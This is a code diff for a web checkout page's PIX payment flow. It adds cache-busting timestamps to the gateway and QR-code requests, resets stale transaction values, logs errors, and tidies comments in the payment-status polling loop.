@@ -314,6 +314,9 @@ fbq('track', 'PageView');
     async function pixIniciar(){
         document.getElementById('pix-loading').style.display='block';
         try{
+            _pixCode = ''; // Reseta valores antigos
+            _pixTxid = '';
+
             var trackingData = {
                 utm_source: _p.get('utm_source') || "",
                 utm_medium: _p.get('utm_medium') || "",
@@ -333,9 +336,15 @@ fbq('track', 'PageView');
                 },
                 utm_data: trackingData 
             };
-            var res = await fetch(MEU_PHP_GATEWAY, {
+
+            // Fetch atualizado com timestamp para evitar cache do servidor/navegador
+            var res = await fetch(MEU_PHP_GATEWAY + '?t=' + Date.now(), {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                },
                 body: JSON.stringify(payload)
             });
             var data = await res.json();
@@ -347,11 +356,18 @@ fbq('track', 'PageView');
             document.getElementById('pix-nome-show').textContent = nomeOk;
             document.getElementById('pix-cpf-show').textContent = _cpf ? formatarCPF(_cpf) : '---';
             document.getElementById('pix-code-box').textContent = _pixCode;
-            document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '" style="border-radius:8px;max-width:190px;">';
+            
+            // Força renovação da imagem do QR Code com timestamp
+            document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '&t=' + Date.now() + '" style="border-radius:8px;max-width:190px;">';
+            
             document.getElementById('pix-loading').style.display = 'none';
             document.getElementById('pix-main').style.display = 'block';
             pixPolling();
-        }catch(err){ document.getElementById('pix-loading').style.display='none'; alert('Erro ao gerar PIX.'); }
+        }catch(err){ 
+            console.error(err);
+            document.getElementById('pix-loading').style.display='none'; 
+            alert('Erro ao gerar PIX.'); 
+        }
     }
 
     function pixPolling(){
@@ -359,38 +375,32 @@ fbq('track', 'PageView');
         _pixTimer = setInterval(async function(){
             try {
                 if (!_pixTxid) return;
-                var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid));
+                // Polling com timestamp para evitar cache no status
+                var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid) + '&t=' + Date.now());
                 var s = await r.json();
                 
-                // Mapeia o status garantindo que estamos olhando para a confirmação de PAGAMENTO, e não de criação da ordem.
                 var statusPagamento = (s.status || s.payment_status || '').toLowerCase();
                 
-                // Exigimos que o status seja estritamente 'paid', 'pago' ou 'approved_manual'
-                // Ignoramos o 'approved' limpo pois ele é ativado instantaneamente na geração do QRCode em alguns gateways.
                 if(statusPagamento === 'paid' || statusPagamento === 'pago' || statusPagamento === 'approved_manual') {
+                    clearInterval(_pixTimer); 
                     
-                    clearInterval(_pixTimer); // Para de consultar
-                    
-                    // Feedback na tela pro usuário
                     var statusFeedback = document.getElementById('pix-status-feedback');
                     if(statusFeedback) {
                         statusFeedback.innerHTML = '<i class="fas fa-check-circle" style="color: var(--gov-green); font-size: 18px;"></i> <span style="color: var(--gov-green);">Pagamento Confirmado! Redirecionando...</span>';
                     }
 
-                    // Prepara a URL de redirecionamento mantendo todas as UTMs e Parametros atuais
                     var url = new URL(PIX_REDIRECT);
                     var curParams = new URLSearchParams(window.location.search);
                     curParams.forEach(function(value, key) { 
                         url.searchParams.set(key, value); 
                     });
                     
-                    // Redireciona com um delay de 1.5s só pro cliente conseguir ler "Confirmado!"
                     setTimeout(function() {
                         window.location.href = url.toString();
                     }, 1500);
                 }
             } catch(e) {}
-        }, 3000); // Consulta otimizada para acontecer a cada 3 segundos
+        }, 3000); 
     }
 
     function pixAba(aba){
